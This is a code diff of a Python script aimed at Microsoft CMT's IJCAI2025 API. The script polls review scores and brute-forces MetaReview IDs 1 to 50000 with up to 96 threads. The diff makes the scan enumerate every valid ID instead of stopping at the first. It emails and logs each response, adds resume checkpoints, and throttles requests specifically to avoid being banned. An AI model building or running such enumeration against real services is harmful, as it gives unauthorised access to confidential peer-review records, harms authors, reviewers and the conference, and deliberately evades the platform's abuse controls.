@@ -1,17 +1,21 @@
 import requests
 import time
 import smtplib
+import os
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # xxxx is the reviewer id (replace it with your own reviewer ID)
 urls = {
-    7200: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
-    16709: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
-    10641: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
-    11802: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
+    xxxx: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
+    xxxx: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
+    xxxx: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
+    xxxx: "https://cmt3.research.microsoft.com/api/odata/IJCAI2025/ReviewViews(xxxx)",
 }
+
+LOG_FILE = "metareview_found.log"
+STATE_FILE = "metareview_state.txt"
 
 # 初始评分状态（第一次抓到后自动初始化）
 last_scores = {}
@@ -57,6 +61,7 @@ def send_email(subject, body):
         print("📧 Email sent successfully!")
     except Exception as e:
         print(f"❌ Email send failed: {e}")
+
 
 
 
@@ -121,7 +126,6 @@ def monitor_review_scores():
 
 
 
-# 单个 ID 检查函数
 def check_metareview_id(rid):
     url = f"https://cmt3.research.microsoft.com/api/odata/IJCAI2025/MetaReviewViews({rid})"
     try:
@@ -130,7 +134,9 @@ def check_metareview_id(rid):
             print(f"✅ Found! MetaReview ID: {rid}")
             send_email("IJCAI2025 - MetaReview Found",
                        f"Found valid MetaReview ID: {rid}\nLink: {url}\n\nResponse:\n{response.text}")
-            return True  # 找到了
+            with open(LOG_FILE, "a") as f:
+                f.write(f"{rid}\n")
+            return True
         else:
             return False
     except Exception as e:
@@ -138,11 +144,24 @@ def check_metareview_id(rid):
         return False
 
 
-# 并发爆破函数
-def brute_force_metareview_parallel(start=1, end=50000, batch_size=1000, max_workers=64):
+def load_last_state():
+    if os.path.exists(STATE_FILE):
+        with open(STATE_FILE, "r") as f:
+            return int(f.read().strip())
+    return 1  # 默认从1开始
+
+
+def save_last_state(last_id):
+    with open(STATE_FILE, "w") as f:
+        f.write(str(last_id))
+
+
+def brute_force_metareview_parallel(end=50000, batch_size=1000, max_workers=64):
+    start = load_last_state()
+    print(f"🚀 Resume from ID: {start}")
     for batch_start in range(start, end, batch_size):
         batch_end = min(batch_start + batch_size, end)
-        print(f"\n🚀 Scanning batch: {batch_start} - {batch_end - 1}")
+        print(f"\n🔍 Scanning batch: {batch_start} - {batch_end - 1}")
 
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             future_to_id = {executor.submit(check_metareview_id, rid): rid for rid in range(batch_start, batch_end)}
@@ -150,16 +169,17 @@ def brute_force_metareview_parallel(start=1, end=50000, batch_size=1000, max_wor
             for future in as_completed(future_to_id):
                 rid = future_to_id[future]
                 try:
-                    if future.result():
-                        print(f"🎯 Stopping early: Found valid MetaReview ID {rid}")
-                        return  # 立即退出整个批次处理
+                    future.result()  # 无需中止，只需执行
                 except Exception as e:
-                    print(f"❌ Future exception: {e}")
+                    print(f"[Exception] ID {rid} -> {e}")
 
-        print(f"📭 Batch {batch_start}-{batch_end - 1} completed. No result found yet.")
+        save_last_state(batch_end)
+        print(f"📦 Batch complete: saved checkpoint at {batch_end}")
+        time.sleep(1)  # 节流一点，避免被 ban
+
+    print("✅ Finished all batches!")
 
 
-# 主入口
+
 if __name__ == "__main__":
-    brute_force_metareview_parallel(start=1, end=50000, batch_size=1000, max_workers=64)
-
+    brute_force_metareview_parallel(end=50000, batch_size=1000, max_workers=96)
